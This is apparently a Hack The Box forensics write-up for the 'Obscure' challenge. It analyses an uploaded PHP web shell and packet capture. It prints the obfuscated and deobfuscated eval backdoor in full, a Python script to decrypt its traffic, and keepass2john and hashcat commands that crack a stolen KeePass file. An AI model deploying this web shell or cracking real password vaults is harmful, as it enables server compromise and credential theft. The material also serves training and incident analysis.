### Obscure

   **DESCRIPTION :** An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). We monitor our network 24/7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.


In the zip file contains a log traffice file and php file named support the php script content a encrypte method
the script is contain obfuscation 

### php script
```
"<?php$V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);functionu)x($';$P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn$o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents(';$d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i';$B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}';$N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion');$c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@';$u=str_replace('u)','',$V.$d.$P.$c.$B);$x=$N('',$u);$x();?>"
```
to deobfuscated the script you don't need any tool or script just remove the obfuscate element is ```u)```  
from the php script. How did you find the obfuscate take bottom line of the script ```$u=str_replace('u)','',$V.$d.$P.$c.$B)``` it say replace with this string 'u)'. So this must be obfuscate 

deobfuscate script is 

```
<?php
$V = '$k = "80e32263";
$kh = "6f8af44abea0"; 
$kf = "351039f4a7b5"; 
$p = "0UlYyJHG87EJqEz6";

function x($t, $k) {
    $c = strlen($k); 
    $l = strlen($t); 
    $o = ""; 
    
    for ($i = 0; $i < $l; ) { 
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) { 
            $o .= $t{$i} ^ $k{$j}; 
        } 
    }
    return $o; 
}

if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) { 
    @ob_start(); 
    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k))); 
    $o = @ob_get_contents(); 
    @ob_end_clean(); 
    $r = @base64_encode(@x(@gzcompress($o), $k)); 
    print("$p$kh$r$kf"); 
}

$N = str_replace('FD', '', 'FDcreFDateFD_fFDuncFDFDtion');
$c = '"php://input")';

$u = str_replace('u)', '', $V . $d . $P . $c . $B);
$x = $N('', $u);
$x();
?>
```
![Screenshot from 2025-01-29 00-23-54](https://github.com/user-attachments/assets/495e4007-ef47-4f97-bf74-00e6e57b0b73)


Let analyze the traffice packeages file. analyze http protocol in the network file your can find strange strings like ```0UlYyJHG87EJqEz66f8af44abea0QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy351039f4a7b5``` 

In the php script you can find prefix strings and suffix strings in the php script 

prefix strings ```0UlYyJHG87EJqEz66f8af44abea0```

suffix strings ```351039f4a7b5```

In encryption they add prefix and suffix strings in the encrypted data  

In wireshark you can get some encrypted strings are : 

1. ```0UlYyJHG87EJqEz66f8af44abea0QKzo43k49AMoNoVOfAMh+6h3euEZJvkTlblqP34rlZqPhxDgKLYMz7NpqfQ9IR9FOXy0OfVbUgo/PF3MxrMw/JOdJebwjE2y6VAxUFnyA4H4dHQNgV49YatbqT0it9IXYf5kzoE4+kfGnZ/dTAsyCesTC0i5V+gJQw6bYm/nU3U/lrYGyl+dgvIOURfl0fvGm0hmr0RZKQ==351039f4a7b5```

2. ```0UlYyJHG87EJqEz66f8af44abea0QKy2/Pr9e+Z3eUh4//sZexUyZR8mN/g=351039f4a7b5```

3. ```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351039f4a7b5```

this encrypte  strings contains both  prefix and suffix 

### eg (prefix is : 0UlYyJHG87EJqEz66f8af44abea,  encrypted data : ```0QKy2/Pr9e+Z3eUh4//sZexUyZR8mN/g=``` suffix is : 351039f4a7b5`)

remove the prefix and suffix from the strings  and decrypte the encode strings 

decrypte script : 

```import base64
import zlib
import gzip
from io import BytesIO
key = b"80e32263"

def xor_decrypt(data, key):
    decrypted = bytearray()
    key_length = len(key)
    for i in range(len(data)):
        decrypted.append(data[i] ^ key[i % key_length])
    return bytes(decrypted)

def decompress_using_gzip(data):
    with BytesIO(data) as f:
        with gzip.GzipFile(fileobj=f, mode='rb') as gzf:
            return gzf.read()

def decompress_and_decrypt(encoded_data, key):
    decoded_data = base64.b64decode(encoded_data)
    decrypted_data = xor_decrypt(decoded_data, key)
    try:
        decompressed_data = zlib.decompress(decrypted_data)
    except zlib.error:
        decompressed_data = decompress_using_gzip(decrypted_data)

    return decompressed_data
encoded_data = "QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy"
decrypted_content = decompress_and_decrypt(encoded_data, key)
print(decrypted_content.decode("utf-8"))
```
The decode message is : 

![Screenshot from 2025-01-29 01-31-51](https://github.com/user-attachments/assets/9fe083d0-f23c-457a-b9e6-bf33af888b12)

every strings decoded but one strings is still encoded 

One of the decoded strings say ls -al command. It show a pwdb.kdbx the kdbx is password manager file but we need a master key to access it.

Now let make a .kdbx file by convert the strings into raw bytes,The string look like base64 to make a .kdbx file decode the strings by base64 save the output in other file named keepass.kdbx using this command ```base64 -d {path/to/.kdbx} > file-name```

use the file command to display the file type 

![Screenshot from 2025-01-29 01-43-24](https://github.com/user-attachments/assets/5b02a93f-5df3-41b3-999c-7d7d3635ef99)

file should show like ```Keepass password database 2.x KDBX``` then your going in correct way 

Now we get the keepass file but need a password to access we don't know the password let burtefoce it 

By burtefoces you can use ```john the rapper```  to extract the hash of the database and stroed the hash in file named hash.txt by using this command ```keepass2john /path/to/.kdbx > hash.txt 
---
### and
---
### Hashcat 

![Screenshot from 2025-01-28 22-34-39](https://github.com/user-attachments/assets/26f686c9-bf47-4397-b2ee-a5e820d28d9e)

### hashcat to crack the hash  

To carcke the hash by this command ```hashcat -m 13400 -a 0 path/to/hash.txt /path/to/wordlist --force```

**0 ->**  0 = Straight
**a ->** attack
**force ->**  Ignore warnings

Now we found the password as : ```chainsaw```

![Screenshot from 2025-01-28 22-39-36](https://github.com/user-attachments/assets/7ee93fbb-4fad-4524-ba7c-dc5a0aa98569)


Now open the keepass file and enter the master key as ```chainsaw``

then you will get flag

---

### Flag is : ```HTB{pr0tect_y0_shellZ}```
















